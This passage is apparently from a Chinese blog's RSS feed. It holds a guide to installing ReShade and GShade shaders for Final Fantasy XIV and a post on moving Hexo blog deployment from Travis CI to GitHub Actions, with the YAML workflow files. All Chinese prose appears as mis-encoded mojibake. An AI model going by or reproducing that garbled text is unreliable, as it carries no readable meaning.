class="headerlink" title="ä¸‹è½½å®‰è£…ç¨‹åº"></a>ä¸‹è½½å®‰è£…ç¨‹åº</h1><p>ä» <a href="https://reshade.me/">ReShade</a> ä¸‹è½½å®‰è£…ç¨‹åºï¼Œé€‰æ‹© <code>with full add-on support</code> çš„ä¸‹è½½ï¼ŒåŒå‡»è¿è¡Œã€‚</p><img src="https://s2.loli.net/2023/08/29/3ZmNXyYWg6OE5Cb.jpg" width="80%" /><h1 id="å…·ä½“å®‰è£…æ­¥éª¤"><a href="#å…·ä½“å®‰è£…æ­¥éª¤" class="headerlink" title="å…·ä½“å®‰è£…æ­¥éª¤"></a>å…·ä½“å®‰è£…æ­¥éª¤</h1><ol><li><p>é€‰æ‹© ffxiv å¯æ‰§è¡Œæ–‡ä»¶</p><p> å®šä½åˆ°æ¸¸æˆå®‰è£…ç›®å½•ä¸‹çš„ <code>ffxiv_dx11.exe</code></p> <img src="https://s2.loli.net/2023/08/29/stZyrA7wl5oFQ4c.jpg" /></li><li><p>é€‰æ‹© API</p><p> é»˜è®¤é€‰æ‹© DX12</p> <img src="https://s2.loli.net/2023/08/29/yULJWuna3IBKwXD.jpg" /></li><li><p>é…ç½®æ–‡ä»¶</p><p> è·³è¿‡ï¼Œä½¿ç”¨ ReShade é»˜è®¤çš„å³å¯</p> <img src="https://s2.loli.net/2023/08/29/Dj4pibJoPyZlmqT.png" /></li><li><p>æ•ˆæœåŒ…</p><p> å¯ä»¥å…ˆ <code>Uncheck all</code> ç„¶åå°±å¯ä»¥ <code>Check all</code>ï¼Œç‚¹å‡» Next ä¸‹è½½ï¼ˆå¯èƒ½éœ€è¦ä»£ç†ï¼‰</p> <img src="https://s2.loli.net/2023/08/29/qbjBiWMP1NJUFZx.png"/></li><li><p>å®‰è£…å®Œæ¯•</p><p> ç‚¹å‡» Finish é€€å‡ºå®‰è£…ç¨‹åº</p> <img src="https://s2.loli.net/2023/08/29/UHamx38RherF1wP.png" /></li></ol><h1 id="è®¾ç½®"><a href="#è®¾ç½®" class="headerlink" title="è®¾ç½®"></a>è®¾ç½®</h1><p>è¿›å…¥æ¸¸æˆåä¼šè‡ªåŠ¨è¿›è¡Œè„šæœ¬ç¼–è¯‘ï¼Œç¼–è¯‘å®Œæˆåå°±å¯ä»¥å¼€å§‹ä½¿ç”¨äº†ã€‚</p><img src="https://s2.loli.net/2023/08/29/wFLT1YxnD2ISWGK.jpg" ><p>é»˜è®¤ä½¿ç”¨æŒ‰é”® <code>Home</code> æ‰“å¼€ ReShade ä¸»ç•Œé¢ï¼ˆé¦–é¡µï¼‰ï¼Œå¦‚æœé”®ç›˜æ²¡æœ‰è¿™ä¸ªæŒ‰é”®æœä¸€ä¸‹æ€ä¹ˆç”¨ç»„åˆé”®æŒ‰ã€‚æ‰“å¼€ä¸»ç•Œé¢åå»ºè®®åœ¨ <code>Settings</code> ä¸­ä¿®æ”¹ä»¥ä¸‹å‡ é¡¹ï¼š</p><ul><li>ä¸»ç•Œé¢å¿«æ·é”®</li><li>æˆªå›¾å¿«æ·é”®</li><li>æˆªå›¾å­˜æ”¾è·¯å¾„</li><li>æˆªå›¾åç§°</li></ul><img src="https://s2.loli.net/2023/08/29/euxiGdglKtTp46c.png" ><h1 id="æ»¤é•œ"><a href="#æ»¤é•œ" class="headerlink" title="æ»¤é•œ"></a>æ»¤é•œ</h1><p>æ‰“å¼€ä¸»ç•Œé¢é€‰æ‹©æ»¤é•œï¼š</p><img src="https://s2.loli.net/2023/08/30/xeEgqmiBujzhwyR.png" ><p>å®‰è£…æ—¶ä¸‹è½½çš„æ»¤é•œå’Œ Shader åˆ†åˆ«åœ¨è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼š</p><img src="https://s2.loli.net/2023/08/30/jO2XCgW8y6wdsno.png" ><p>æ»¤é•œå¯ä»¥åœ¨ FF ä¸­ä½¿ç”¨ï¼Œä½†æ˜¯æ•ˆæœæ¯”è¾ƒæ®‹å¿µï¼Œæ„Ÿè§‰ GShade æ˜¯é’ˆå¯¹ FFXIV åšäº†å®šåˆ¶çš„ ğŸ¤”</p><h1 id="GShade-æ»¤é•œ"><a href="#GShade-æ»¤é•œ" class="headerlink" title="GShade æ»¤é•œ"></a>GShade æ»¤é•œ</h1><h2 id="æ–¹æ³•ä¸€ï¼šæ‰‹åŠ¨æ›¿æ¢"><a href="#æ–¹æ³•ä¸€ï¼šæ‰‹åŠ¨æ›¿æ¢" class="headerlink" title="æ–¹æ³•ä¸€ï¼šæ‰‹åŠ¨æ›¿æ¢"></a>æ–¹æ³•ä¸€ï¼šæ‰‹åŠ¨æ›¿æ¢</h2><p>ä» <a href="https://drive.google.com/file/d/1Nq5oM7VNgRyKXbX6IRE6Ib9ezWjvolN3/view?usp=sharing">è°·æ­Œäº‘ç›˜</a> ä¸‹è½½å¹¶æ›¿æ¢ reshade-shaders å’Œ reshade-presets ä¸¤ä¸ªæ–‡ä»¶å¤¹ã€‚</p><p>å¦‚æœé‡åˆ° Shader ç¼–è¯‘é”™è¯¯ï¼Œå³é”®æ‰“å¼€æŠ¥é”™çš„ Shaderï¼Œå‚ç…§ <a href="https://www.pcgamingwiki.com/wiki/ReShade#List_of_known_shader_repositories">List of known shader repositories</a> æŸ¥æ‰¾æ¥æºï¼Œä¸‹è½½æ–°çš„ Shader å¹¶æ›¿æ¢ã€‚</p><img src="https://s2.loli.net/2023/08/30/x1rD7HwTpQchVuI.png" ><p>æˆ–è€…å¯ä»¥è¯•è¯•ä» <a href="https://github.com/Mortalitas/GShade">Mortalitas&#x2F;GShade</a> ä¸‹è½½å›¾ä¸­æ‰€ç¤ºçš„ä¸‰ä¸ªæ–‡ä»¶å¤¹ï¼Œè¦†ç›–æ¸¸æˆå®‰è£…è·¯å¾„ä¸‹ Shaders æ–‡ä»¶å¤¹ä¸­çš„åŒåæ–‡ä»¶å¤¹ï¼ˆè®°å¾—å¤‡ä»½åŸæ¥çš„ï¼‰ï¼Œåƒä¸‡åˆ«åœ¨è¿™é‡Œä¸‹è½½ GShade å®‰è£…ç¨‹åºï¼</p><img src="https://s2.loli.net/2023/09/09/8hsxvji9AZ3fFSp.jpg" ><h2 id="æ–¹æ³•äºŒï¼šå®‰è£…æ—§ç‰ˆ-GShade"><a href="#æ–¹æ³•äºŒï¼šå®‰è£…æ—§ç‰ˆ-GShade" class="headerlink" title="æ–¹æ³•äºŒï¼šå®‰è£…æ—§ç‰ˆ GShade"></a>æ–¹æ³•äºŒï¼šå®‰è£…æ—§ç‰ˆ GShade</h2><p>æ³¨æ„ï¼šReShade å’Œ GShade åº”è¯¥ä¸èƒ½åŒæ—¶ä½¿ç”¨ï¼Œæ‰€ä»¥è¯·ä¿è¯åœ¨å¸è½½å¹²å‡€ä¹‹åå†å®‰è£…ã€‚</p><p>å¯ä»¥ä»ä»¥ä¸‹é“¾æ¥ä¸‹è½½ Gshade v4.0.3ï¼Œåˆ†åˆ«æ˜¯ä¸­æ–‡ç‰ˆå’Œè‹±æ–‡ç‰ˆ</p><ul><li><a href="https://docs.qq.com/doc/DVWFuQnVCT256eG1a?u=c3f9abfabbf74fc586f3ca142aa3c48a">GShadeä¿å§†çº§æ•™ç¨‹ï¼ˆé€‚ç”¨4.x.xç‰ˆæœ¬ï¼‰</a></li><li><a href="https://twitter.com/miss_forma/status/1623928907266400263">GShade 4.0.3 Forever no update version, no malware, no forceconnect, no bullshit</a></li><li>ä¹Ÿå¯ä»¥ä» <a href="https://pan.baidu.com/s/1qIrelIy2zd4b3QU95CkXTw?pwd=zlyp">ç™¾åº¦ç½‘ç›˜</a> ä¸‹è½½</li></ul><p>ä¸‹è½½å®Œæ¯•åæ‹–æ”¾ç½® game æ–‡ä»¶å¤¹ï¼š</p><img src="https://s2.loli.net/2023/08/31/9JFsSHjZNLyquYh.png" width="80%" /><p>æ‰“å¼€æ¸¸æˆï¼š</p><img src="https://s2.loli.net/2023/08/31/Pcvj1wOIGNBW3yg.jpg" ><p>ä½¿ç”¨æç¤ºçš„å¿«æ·é”®æ‰“å¼€ç•Œé¢ï¼Œå»ºè®®ä¿®æ”¹ <code>Settings</code> ä¸­çš„è¿™å‡ é¡¹ï¼š</p><img src="https://s2.loli.net/2023/08/31/iMYTr9oRFPHIy68.jpg" width="50%" /><p>å¦‚æœé‡åˆ° Shader ç¼–è¯‘é”™è¯¯ï¼ŒåŒæ ·å¯ä»¥ä» <a href="https://github.com/Mortalitas/GShade">Mortalitas&#x2F;GShade</a> ä¸‹è½½æ–‡ä»¶å¤¹è¿›è¡Œè¦†ç›–ã€‚</p><h1 id="å¸è½½"><a href="#å¸è½½" class="headerlink" title="å¸è½½"></a>å¸è½½</h1><p>å†æ¬¡è¿è¡Œ ReShade å®‰è£…ç¨‹åºï¼Œé€‰æ‹© ffxiv å¯æ‰§è¡Œæ–‡ä»¶ä¸ APIï¼Œç„¶åå°±å¯ä»¥é€‰æ‹© <code>Uninstall</code> å¸è½½äº†</p><img src="https://s2.loli.net/2023/08/31/pbl6NILaWx4XKB2.png" ><p>å¸è½½å®Œæˆä¹‹åè¿˜éœ€è¦æ‰‹åŠ¨åˆ é™¤ reshade-presets æ–‡ä»¶å¤¹</p><img src="https://s2.loli.net/2023/08/31/eEQHL1Ciz8rDajf.png" ><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li><a href="https://www.reddit.com/r/ffxiv/comments/10vya2j/switching_to_reshade_from_gshade_for_those_having/">Switching to Reshade from GShade for those having trouble, 2023 Reshade Installing</a></li><li><a href="https://www.reddit.com/r/ReShade/comments/15i440f/some_effects_failed_to_compile_after_updating_to/">Some Effects â€˜Failed to Compileâ€™ After Updating to 5.9.0</a></li><li><a href="https://reshade.me/forum/shader-troubleshooting/9006-ffxiv-reshade-5-9-1-failed-to-compile-solved">FFXIV - ReShade 5.9.1 Failed To Compile (SOLVED)</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Game/">Game</category>
      
      
      <category domain="https://jckling.github.io/tags/FFXIV/">FFXIV</category>
      
      
      <comments>https://jckling.github.io/2023/08/30/Game/FFXIV/FF14-ReShade%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Github Action è‡ªåŠ¨éƒ¨ç½² Hexo åšå®¢</title>
      <link>https://jckling.github.io/2023/02/18/Other/Github%20Action%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%20Hexo%20%E5%8D%9A%E5%AE%A2/</link>
      <guid>https://jckling.github.io/2023/02/18/Other/Github%20Action%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%20Hexo%20%E5%8D%9A%E5%AE%A2/</guid>
      <pubDate>Sat, 18 Feb 2023 13:00:25 GMT</pubDate>
      
      <description>ä» Travis CI è¿ç§»åˆ° Github Action</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åˆšå¼€å§‹ä½¿ç”¨ Github æ‰˜ç®¡åšå®¢æ—¶ä½¿ç”¨ <a href="https://jckling.github.io/2020/04/23/Other/Travis%20CI%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/">Travis CI è‡ªåŠ¨éƒ¨ç½² Hexo åšå®¢</a>ï¼Œä¸€ä¸ªç§äººä»“åº“ç”¨äºå¤‡ä»½åšå®¢æºç ï¼Œå¦ä¸€ä¸ªå…¬å¼€ä»“åº“ç”¨äºæ‰˜ç®¡é™æ€é¡µé¢ï¼Œä½†æ˜¯æœ€è¿‘å°†ä¿®æ”¹çš„æ–‡ç« æ¨é€åˆ°ç§äººä»“åº“æ—¶æ²¡æœ‰è§¦å‘ Travis CI çš„å·¥ä½œæµï¼Œæç¤º ğŸ‘‡</p><img src="https://s2.loli.net/2023/02/18/ph562ruwxdMDYF3.jpg"><p>æŸ¥è¯¢ Plan é¡µé¢å‘ç°è‡ªå·±ä½¿ç”¨çš„æ˜¯å…è´¹ç‰ˆï¼Œç›®å‰çš„ç­–ç•¥æ˜¯ä¸€æ¬¡æ€§ç»™äºˆç”¨æˆ· 10000 å¯ç”¨é¢åº¦ï¼Œè€Œæˆ‘è¿˜å‰©ä½™ 3700 å¯ç”¨é¢åº¦ï¼Œå¹¶ä¸”å¼€å¯äº† <code>Consume paid credits for OSS</code> é€‰é¡¹ï¼š</p><img src="https://s2.loli.net/2023/02/18/56nRbxzojY3tlqF.png" width="65%"><p>æœç´¢äº†ä¸€åœˆå‘ç°ä¹Ÿæœ‰ç›¸åŒæƒ…å†µçš„ç”¨æˆ·ï¼Œçœ‹èµ·æ¥æ²¡ä»€ä¹ˆè§£å†³åŠæ³•ï¼Œé™¤éæé’±ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰ã€‚</p><ul><li><a href="https://travis-ci.community/t/builds-just-stopped-due-to-a-negative-credit-balance-despite-having-an-active-subscription/10817">Builds just stopped due to a negative credit balance despite having an active subscription</a></li><li><a href="https://github.com/keptn/keptn/issues/2715">Travis CI builds are disabled due to negative credit balance #2715</a></li><li><a href="https://www.v2ex.com/t/736510">Travis CI æ”¹å˜æ”¶è´¹ç­–ç•¥äº†ï¼Œè¿˜åœ¨ä½¿ç”¨å…è´¹æ–¹æ¡ˆçš„æœ‹å‹ä»¬éœ€è¦æ³¨æ„äº†</a></li></ul><p>ä¹‹å‰å†™çš„ <a href="https://github.com/jckling/Daily-Bonus">ç­¾åˆ°è„šæœ¬</a> å’Œ <a href="https://github.com/jckling/tg-bot">æ¨é€è„šæœ¬</a> éƒ½æ˜¯ç”¨ Github Action å®šæ—¶è¿è¡Œï¼Œè€Œä¸” Github è¿˜æä¾›äº†ä» Travis CI è¿ç§»åˆ° Github Action çš„æŒ‡å— <a href="https://docs.github.com/en/actions/migrating-to-github-actions/migrating-from-travis-ci-to-github-actions">Migrating from Travis CI to GitHub Actions</a>ï¼Œä¸ªäººæ„Ÿè§‰è¿ç§»è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ã€‚</p><h1 id="Travis-CI-é…ç½®æ–‡ä»¶"><a href="#Travis-CI-é…ç½®æ–‡ä»¶" class="headerlink" title="Travis CI é…ç½®æ–‡ä»¶"></a>Travis CI é…ç½®æ–‡ä»¶</h1><p>åœ¨ Travis-CI çš„ä»»åŠ¡é¡µé¢ç‚¹å‡» <code>View Config</code> å¯ä»¥çœ‹åˆ°ç§äººä»“åº“æ ¹ç›®å½•ä¸‹çš„ .travis.yml é…ç½®æ–‡ä»¶ï¼Œå…·ä½“å†™æ³•å¯ä»¥å‚è€ƒ Travis CI çš„æ–‡æ¡£ <a href="https://docs.travis-ci.com/user/languages/javascript-with-nodejs/">Building a JavaScript and Node.js project</a>ã€‚</p><p>æ³¨æ„ï¼Œé…ç½®ä¸­çš„ <code>GH_TOKEN</code> æ˜¯åœ¨ Github ä¸­ç”Ÿæˆçš„ <a href="https://github.com/settings/tokens">Personal access tokens</a></p><ol><li><code>dist</code>ï¼šä½¿ç”¨ focal å‘è¡Œç‰ˆçš„ Ubuntu è¿è¡Œ</li><li><code>language</code>ï¼šä½¿ç”¨ Node.js</li><li><code>node_js</code>ï¼šå®‰è£…é•¿æœŸæ”¯æŒç‰ˆæœ¬çš„ Nodejs</li><li><code>cache</code>ï¼šç¼“å­˜ node_modules</li><li><code>branches</code>ï¼šä»… master åˆ†æ”¯ä¼šè§¦å‘å·¥ä½œæµ</li><li><code>before_install</code>ï¼šè®¾ç½®æ—¶åŒºå’Œ Github ç”¨æˆ·å&#x2F;é‚®ç®±</li><li><code>install</code>ï¼šä½¿ç”¨ yarn å®‰è£…ä¾èµ–</li><li><code>script</code>ï¼šæ‰§è¡Œ <code>hexo generate</code> ç”Ÿæˆé™æ€é¡µé¢</li><li><code>after_script</code>ï¼šå°†æ–°ç”Ÿæˆçš„é™æ€é¡µé¢æäº¤åˆ°å…¬å¼€ä»“åº“</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dist:</span> <span class="string">focal</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">lts/*</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">yarn:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">directories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">node_modules</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">export</span> <span class="string">TZ=&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">&quot;jckling&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">&quot;jckling@163.com&quot;</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">yarn</span> <span class="string">install</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">clone</span> <span class="string">https://github.com/jckling/jckling.github.io.git</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cp</span> <span class="string">-r</span> <span class="string">./public/*</span> <span class="string">./jckling.github.io/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cd</span> <span class="string">jckling.github.io</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">commit</span> <span class="string">-m</span> <span class="string">&quot;Travis-CI Automated Deployment $(date +&#x27;%Y-%m-%d %H:%M:%S&#x27;)&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">push</span> <span class="string">&quot;https://$&#123;GH_TOKEN&#125;@github.com/jckling/jckling.github.io.git&quot;</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h1 id="è¿ç§»åˆ°-Github-Action"><a href="#è¿ç§»åˆ°-Github-Action" class="headerlink" title="è¿ç§»åˆ° Github Action"></a>è¿ç§»åˆ° Github Action</h1><p>Github Action çš„é…ç½®æ–‡ä»¶å¿…é¡»åœ¨ä»“åº“æ ¹ç›®å½•çš„ .github&#x2F;workflows&#x2F; è·¯å¾„ä¸‹ï¼Œå› æ­¤å¾—å…ˆåœ¨åšå®¢æ ¹ç›®å½•åˆ›å»ºæ–‡ä»¶å¤¹ã€‚ä¹‹å‰æŠŠæ–‡ä»¶å¤¹åˆ›å»ºæˆäº† workflow å¯¼è‡´æ²¡æœ‰è§¦å‘å·¥ä½œæµâ€¦â€¦</p><p>åœ¨ workflows ç›®å½•ä¸‹åˆ›å»ºå¹¶æ·»åŠ é…ç½®æ–‡ä»¶ deploy.ymlï¼Œæ”¹å†™åçš„é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><ol><li><code>name</code>ï¼šå·¥ä½œæµåç§°ï¼Œè‡ªåŠ¨è§¦å‘æ—¶ä¼šä»¥æ­¤ä½œä¸ºåç§°ï¼Œæ¨é€è§¦å‘ä¼šä»¥è¯´æ˜ä½œä¸ºåç§°</li><li><code>on</code>ï¼šä»… push è§¦å‘ï¼Œä»…é™ master åˆ†æ”¯ </li><li><code>jobs</code>ï¼šä½œä¸š<ul><li><code>deploy</code>ï¼šä½œä¸šåç§°ï¼Œå”¯ä¸€<ul><li><code>runs-on</code>ï¼šä½¿ç”¨æœ€æ–°çš„ Ubuntu ç³»ç»Ÿè¿è¡Œï¼Œç›®å‰æ˜¯ 20.04</li><li><code>env</code>ï¼šè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå‚è§ <a href="https://github.com/jckling/Daily-Bonus#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">ç­¾åˆ°è„šæœ¬ä½¿ç”¨æ–¹å¼</a></li><li><code>steps</code>ï¼šä»»åŠ¡</li></ul></li></ul></li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Blog</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">      <span class="attr">GH_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GH_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">submodules:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Set</span> <span class="string">up</span> <span class="string">timezone</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">sudo</span> <span class="string">timedatectl</span> <span class="string">set-timezone</span> <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Echo</span> <span class="string">current</span> <span class="string">time</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">timedatectl</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Set</span> <span class="string">up</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">lts/*</span></span><br><span class="line">          <span class="attr">cache:</span> <span class="string">&#x27;yarn&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">Hexo</span> <span class="string">CLI</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">hexo-cli</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">borales/actions-yarn@v4</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">cmd:</span> <span class="string">install</span></span><br><span class="line">      </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Generate</span> <span class="string">pages</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Git</span> <span class="string">config</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;jckling&quot;</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;jckling@163.com&quot;</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">blog</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git clone https://github.com/jckling/jckling.github.io.git</span></span><br><span class="line"><span class="string">          cp -r ./public/* ./jckling.github.io/</span></span><br><span class="line"><span class="string">          cd jckling.github.io</span></span><br><span class="line"><span class="string">          git add .</span></span><br><span class="line"><span class="string">          git commit -m &quot;Github Action Automated Deployment $(date +&#x27;%Y-%m-%d %H:%M:%S&#x27;)&quot;</span></span><br><span class="line"><span class="string">          git push &quot;https://$&#123;GH_TOKEN&#125;@github.com/jckling/jckling.github.io.git&quot; master</span></span><br></pre></td></tr></table></figure><p>åˆ é™¤åŸå…ˆçš„ Travis CI é…ç½®æ–‡ä»¶ .travis.ymlï¼Œç›®å‰å¤‡ä»½çš„åšå®¢å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ .gitignore</span><br><span class="line">â”œâ”€â”€ _config.yml</span><br><span class="line">â”œâ”€â”€ _config.butterfly.yml</span><br><span class="line">â”œâ”€â”€ yarn.lock</span><br><span class="line">â”œâ”€â”€ package.json</span><br><span class="line">â”œâ”€â”€ .github</span><br><span class="line">â”‚Â Â  â””â”€â”€ workflows</span><br><span class="line">â”‚Â Â  Â Â  â””â”€â”€ deploy.yml</span><br><span class="line">â”œâ”€â”€ scaffolds</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ draft.md</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ page.md</span><br><span class="line">â”‚Â Â  â””â”€â”€ post.md</span><br><span class="line">â”œâ”€â”€ source</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ robots.txt</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ _data</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ _posts</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ about</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ categories</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ link</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ music</span><br><span class="line">â”‚Â Â  â””â”€â”€ tags</span><br><span class="line">â””â”€â”€ themes</span><br><span class="line">    â””â”€â”€ butterfly</span><br></pre></td></tr></table></figure><h1 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h1><p>Github Action æ²¡æœ‰å¾ˆå¥½çš„æœ¬åœ°æµ‹è¯•å·¥å…·ï¼Œå› æ­¤è¿ç§»æ—¶åœ¨åšå®¢ä»“åº“ä¸­æ–°å»ºäº†ä¸€ä¸ª test åˆ†æ”¯è¿›è¡Œæµ‹è¯•ï¼Œæ³¨æ„æµ‹è¯•æ—¶éœ€è¦å…è®¸æµ‹è¯•åˆ†æ”¯çš„æäº¤è§¦å‘æ„å»ºæµç¨‹ï¼š</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">      <span class="bullet">-</span> <span 